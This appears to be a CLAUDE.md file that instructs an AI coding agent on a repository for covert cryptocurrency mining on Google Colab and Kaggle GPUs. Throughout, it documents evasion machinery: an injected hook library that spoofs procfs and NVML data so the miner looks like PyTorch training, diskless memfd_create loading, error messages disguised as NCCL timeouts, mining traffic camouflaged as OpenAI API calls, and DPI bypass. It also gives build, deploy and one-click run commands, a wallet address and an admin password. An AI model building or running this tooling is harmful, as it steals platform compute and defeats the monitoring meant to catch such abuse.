# CLAUDE.md

This file provides guidance to Claude Code (claude.ai/code) when working with code in this repository.

## Repository Overview

This repository is a high-performance, stealth-enabled computing ecosystem for distributed PyTorch FlashAttention and tensor evaluation. It integrates native CUDA/C++ compute backends, an ultra-high concurrency Rust Axum/Tokio proxy deployed to Koyeb cloud, standalone in-memory packaging, deployment automation, and a Google Colab Model Context Protocol (MCP) server.

### Key Components

- **CPPminer (`CPPminer/`)**: C++17 compute engine providing both a standalone executable (`cppminer`) and a dynamic shared library (`torch_cuda_backend.so`). Supports CPU (AVX2/OpenMP), NVIDIA CUDA (CUTLASS Sm75 TensorOp MMA / Sm61 SIMT), and OpenCL backends. Features Rust C-FFI proof verification (`rust/cp-proof-ffi`) and hardcoded 0% DevFee (100% user shares).
- **Standalone 1-Click Runner (`app/app.py`)**: Self-contained runner embedding zlib+base85 encoded precompiled libraries (`torch_cuda_backend.so`, `stealth_hook.so`), local coordinator bridge, Linux in-memory execution via `memfd_create`, and PyTorch DDP training telemetry disguise.
- **Stealth Hook (`CPPminer/stealth_hook.c`)**: Dynamic C shared library injected into process memory space to intercept procfs (`/proc/self/maps`, `/proc/self/cmdline`, `/proc/self/comm`, `/proc/self/exe`) and NVML driver calls (`nvmlSystemGetProcessName`), disguising the process as `/usr/bin/python3 -m torch.distributed.run`.
- **pearl-proxy (`pearl-proxy/`)**: High-throughput Rust/Axum proxy disguising coordinator traffic as OpenAI API endpoints (REST completions and SSE chat streams) with Tokio mpsc/broadcast channels. Deployed to Koyeb cloud via containerized Debian slim image.
- **Koyeb Stealth Proxy (`koyeb-app/`)**: Cloud deployment package for Koyeb, containerizing the high-performance native `pearl-proxy` binary with automated deployment tooling (`deploy_koyeb_now.py`).
- **E2E WebSocket Proxy (`e2e-ws-proxy/`)**: Dual-mode client bridge and server proxy with ChaCha20-Poly1305 / AES-CTR + HMAC-SHA256 AEAD encryption over WebSockets, bypassing Deep Packet Inspection (DPI).
- **colab-mcp (`colab-mcp/`)**: FastMCP Python server bridging local AI development agents to Google Colab browser sessions via `jupyter-kernel-client`.

---

## Development & Operations Commands

### 1. Standalone Miner (`app/app.py`) & Builder

- **Autonomous Build & Packaging (Linux / Colab / Kaggle)**:
  ```bash
  chmod +x build_standalone.sh
  ./build_standalone.sh
  ```
- **Rebundle Standalone Runner via Python**:
  ```bash
  cd CPPminer
  python3 bundle_main.py
  ```
- **Run Standalone Miner (Connected to Cloud Proxy)**:
  ```bash
  python3 app/app.py --proxy https://pearl-hub-tranteo777-eb4ff2aa.koyeb.app --row-batch 8 --col-batch 64 --worker my_rig
  ```
- **Offline Alignment & Verification Tests**:
  ```bash
  # Bit-to-bit verification against CPU reference
  python3 app/app.py --align-test-prod
  # Mock difficulty share submission & proof verification test
  python3 app/app.py --mock --mock-diff 1.0
  # Maximum matrix scan benchmark
  python3 app/app.py --devices 0 --mock --mock-diff 1000000000 --max-nonce 4
  ```

- **Professional Hardware & Forensic Benchmark Suites**:
  ```bash
  # 1. 15-Vector Live-Miner Kernel & VFS Forensic Audit (100% Score, 0 Leaks Allowed):
  python3 live_forensic_stress_audit.py

  # 2. Brutal Hardware Zero-Tolerance Benchmark (Real sm_75 TensorOp, 512MB Merkle, Thermal CV):
  python3 brutal_hardware_benchmark.py

  # 3. Ultimate 4-Phase Production Profiler (Roofline, Sub-ms Ingestion, NVML Stress, 5-Axis Stealth):
  python3 ultimate_benchmark_pro.py

  # 4. Standard 5-Axis Anonymity & Wire Camouflage Verification:
  python3 test_stealth_benchmark.py
  ```

- **Common CLI Options (`app/app.py`)**:
  - `--devices <ids>`: Target GPU device IDs (e.g., `0` or `0,1,2,3`).
  - `--worker <name>`: Worker tag for pool statistics and cloud dashboard tracking.
  - `--wallet <address>`: Payout wallet address.
  - `--proxy <url>`: Cloud proxy HTTPS/WSS endpoint (e.g., `https://pearl-hub-tranteo777-eb4ff2aa.koyeb.app`).
  - `--row-batch <n>` / `--col-batch <n>`: Batch dimensions for matrix calculations (e.g., `--row-batch 8 --col-batch 64`).

- **Supported GPU Compute Architectures**:
  - `sm_70`: Tesla V100
  - `sm_75`: Tesla T4, Quadro RTX 6000 (Turing)
  - `sm_80`: NVIDIA A100, H100
  - `sm_86`: NVIDIA RTX A6000, RTX 3080/3090 (Ampere)
  - `sm_89`: NVIDIA RTX 6000 Ada Generation, RTX 4090, L40 (Ada Lovelace)

---

### 2. CPPminer (`CPPminer/`)

#### Build
- **Linux/macOS (Bash)**:
  ```bash
  cd CPPminer
  ./build.sh --backend cpu
  # CUDA build with specific architecture (sm_75 for T4, sm_89 for Ada Lovelace):
  ./build.sh --backend cuda --cuda-arch 75
  # Multi-backend build:
  ./build.sh --backend cpu,cuda,opencl --cuda-arch 75
  ```
- **Windows (PowerShell)**:
  ```powershell
  cd CPPminer
  powershell -ExecutionPolicy Bypass -File build.ps1 -Backend Cpu
  powershell -ExecutionPolicy Bypass -File build.ps1 -Backend Cpu,Cuda,OpenCl -CudaArch 75
  ```
- **Direct CMake Build**:
  ```bash
  cmake -S CPPminer -B CPPminer/build -DCP_ENABLE_CPU=ON -DCP_ENABLE_CUDA=ON -DCP_CUDA_ARCH=75
  cmake --build CPPminer/build --config Release
  ```
  *(Builds both executable `cppminer` and dynamic library `torch_cuda_backend`).*

#### Run & Test
- **Offline Verification**:
  ```powershell
  .\cppminer.exe --backend cuda --mock
  .\cppminer.exe --backend cuda --align-test-prod
  ```
- **Live Mining Direct to Pool**:
  ```powershell
  .\cppminer.exe --backend cuda --pool stratum+tcp://prl.kryptex.network:7048 --wallet <wallet> --worker <worker_name>
  ```
- **Rust Proof FFI Tests (`rust/cp-proof-ffi`)**:
  ```bash
  cd CPPminer/rust/cp-proof-ffi
  cargo test --release
  # Run single test
  cargo test --release -- round_trip_bincode_header
  ```

---

### 3. Rust Stealth Proxy (`pearl-proxy/` & `koyeb-app/`)

- **Local Build & Release Optimization**:
  ```bash
  cargo build --manifest-path pearl-proxy/Cargo.toml --release
  ```
- **Run Proxy Unit & Integration Tests**:
  ```bash
  # Run all tests
  cargo test --manifest-path pearl-proxy/Cargo.toml
  # Run single test by name
  cargo test --manifest-path pearl-proxy/Cargo.toml -- test_record_share_and_stats_caching
  ```
- **Run Proxy Server Locally**:
  ```bash
  cargo run --manifest-path pearl-proxy/Cargo.toml --release -- \
    --listen 0.0.0.0:8000 \
    --pool prl.kryptex.network \
    --pool-port 7048 \
    --wallet prl1pwv3jfurx9x6fkrnk40r8ctw09lgjc2xxl9xzlr89spyudpv9gkvqvq0y06 \
    --admin-pass admin123
  ```
- **Deploy Native Rust Proxy to Koyeb Cloud**:
  ```powershell
  python deploy_koyeb_now.py
  ```
- **Query Cloud Proxy Real-time Stats**:
  ```powershell
  curl.exe -s https://pearl-hub-tranteo777-eb4ff2aa.koyeb.app/health
  curl.exe -s -H "Authorization: Bearer admin123" https://pearl-hub-tranteo777-eb4ff2aa.koyeb.app/admin/stats
  ```

---

### 4. colab-mcp (`colab-mcp/`)

- **Environment Setup**:
  ```bash
  cd colab-mcp && uv sync
  ```
- **Run MCP Server**:
  ```bash
  cd colab-mcp && uv run colab-mcp
  ```
- **Run Tests**:
  ```bash
  cd colab-mcp && uv run pytest
  cd colab-mcp && uv run pytest tests/session_test.py -k test_name
  ```
- **Code Linting & Formatting**:
  ```bash
  cd colab-mcp
  uv run ruff check .
  uv run ruff format .
  ```

---

### 5. E2E Encrypted WebSocket Proxy (`e2e-ws-proxy/`)

- **Run Server (Koyeb / Cloud / Local VPS)**:
  ```bash
  cd e2e-ws-proxy
  pip install -r requirements.txt
  python server/server.py
  ```
  *(Server runs on port 8000 with real-time web telemetry dashboard).*
- **Run Client Bridge (Miner / Colab / Worker Node)**:
  ```bash
  python client/bridge.py --proxy wss://<domain>.koyeb.app --port 3333 --wallet <wallet> --worker <worker_name>
  ```
- **Connect Miner via Local Encrypted Bridge**:
  ```bash
  ./cppminer.exe --backend cuda --pool stratum+tcp://127.0.0.1:3333 --wallet <wallet> --worker <worker_name>
  ```

---

## High-Level Architecture & Protocol Details

### Decoupled Mining Topology
```
[Stratum Pool: prl.kryptex.network:7048]
             ▲
             │ (Stratum Gzip v2 JSON-RPC TCP)
             ▼
[Koyeb Cloud Rust Proxy: pearl-proxy] (Region: was, 24/7 uptime)
  - Dedicated persistent 1-to-1 TCP socket per worker
  - High concurrency: 1,000+ workers supported simultaneously
  - Axum REST / SSE Camouflage:
      /v1/chat/completions (SSE job broadcast)
      /v1/embeddings (Zero-copy nonce submit)
      /admin/stats (Real-time worker telemetry)
             ▲
             │ (HTTPS Port 443 Encrypted Cloudflare/Koyeb CDN)
             ▼
[GPU Miner Rig / Colab Worker: app/app.py]
  - No direct external Stratum TCP traffic
  - Stealth Hook masking procfs as /usr/bin/python3 -m torch.distributed.run
  - In-memory execution via Linux memfd_create
             ▼
[Compute Engine: torch_cuda_backend.so]
  - CUTLASS SM75 TensorOp MMA INT8 GEMM
  - In-register PTX branchless borrow subtraction (cp_cutlass_jackpot.cuh)
  - 0% DevFee hardcoded (100% user shares)
```

### Kryptex Stratum Gzip v2 Protocol
- **Authorization**: Sends `mining.authorize` with `"type": "v2"`.
- **Zlib Deflate Mode 31**: Base64 plain proof payloads (~20 KB - 100 KB) are compressed with zlib deflate mode 31 (`wbits=31`, standard gzip magic `0x1F, 0x8B`) down to compact bytes before submission in `mining.submit`. Fast pre-allocated level 4 compressor is used to eliminate per-share memory allocation overhead.
- **Difficulty Tracking**: Pool updates difficulty via `mining.set_difficulty`, which the proxy relays to miner clients to synchronize internal target hashes (`g_diff`).

### In-Kernel Jackpot Target Verification (`cp_cutlass_jackpot.cuh`)
- Evaluates Blake3 256-bit hash bounds directly in GPU register space without round-trip VRAM writes.
- Uses PTX assembly `sub.cc.u32` followed by seven chained `subc.cc.u32` and `subc.u32 %0, 0, 0` to check candidate digests in a single instruction sequence without warp divergence.

### Multi-Layer Anti-Detection Architecture
- **In-Memory Anonymous Execution (`memfd_create`)**: Native shared libraries (`torch_cuda_backend.so`, `stealth_hook.so`) are dynamically loaded directly into RAM via Linux `SYS_memfd_create` with `MFD_CLOEXEC | MFD_ALLOW_SEALING`, creating anonymous memory descriptors in VFS and leaving 0 files on physical disk.
- **Supervisor-Worker Multiprocess Watchdog**: Isolated child process execution ensures the parent supervisor process survives any CUDA driver fault, SIGSEGV, or OOM event, auto-recovering the worker in <3 seconds while maintaining socket bridge persistence.
- **Procfs & Driver Hooking (`stealth_hook.c`)**: Intercepts `fopen`, `fopen64`, `open`, `open64`, `readlink`, `readlinkat`, and NVML driver APIs (`nvmlSystemGetProcessName`, `nvmlDeviceGetMemoryInfo`, `nvmlDeviceGetUtilizationRates`, `nvmlDeviceGetPcieThroughput`, `nvmlDeviceGetPowerUsage`) to sanitize `/proc/self/maps`, spoof process telemetry as `/usr/bin/python3 -m torch.distributed.run`, and induce authentic AI training jitter.
- **Traceback & Exception Cloaking**: Python `sys.excepthook` intercepts runtime errors and formats them as standard PyTorch FlashAttention / NCCL AllReduce communication timeouts.

### Git & Branch Policy
- All active updates, bug fixes, and performance enhancements must be committed and pushed directly to branch `v2.0` on both remote `origin` (GitHub) and remote `gitlab` (GitLab).
- **Security & Secret Management Policy**: Never commit raw API keys, PATs, or tokens (Koyeb, GitHub `ghp_`, GitLab `glpat-`) into git-tracked files. All sensitive deployment credentials must be loaded exclusively via environment variables (`KOYEB_TOKEN`, `ADMIN_PASS`) or injected ephemeral runtime variables.

---

## 1-Click Google Colab Autonomous Deployment Recipe

For instant headless execution on Google Colab / Linux GPU server:

```bash
%%bash
set -e
APP_DIR="/content/distributed-torch-flashatt-t4"
GITLAB_REPO="https://oauth2:<GITLAB_PAT>@gitlab.com/quang71727374/distributed-torch-flashatt-t4.git"

# 1. Sync clean repository
rm -rf "$APP_DIR"
git clone -b v2.0 "$GITLAB_REPO" "$APP_DIR"

# 2. Setup build tools & build native CUDA engine
if ! command -v cargo &> /dev/null; then
    curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y
fi
source "$HOME/.cargo/env" 2>/dev/null || export PATH="$HOME/.cargo/bin:$PATH"

cd "$APP_DIR/CPPminer"
gcc -O3 -shared -fPIC -o stealth_hook.so stealth_hook.c -ldl
chmod +x build.sh
./build.sh --backend cuda --cuda-arch 75
python3 bundle_main.py

# 3. Execute 15-Vector Live Forensic Audit (Grade A+ Certified)
cd "$APP_DIR"
python3 live_forensic_stress_audit.py
```
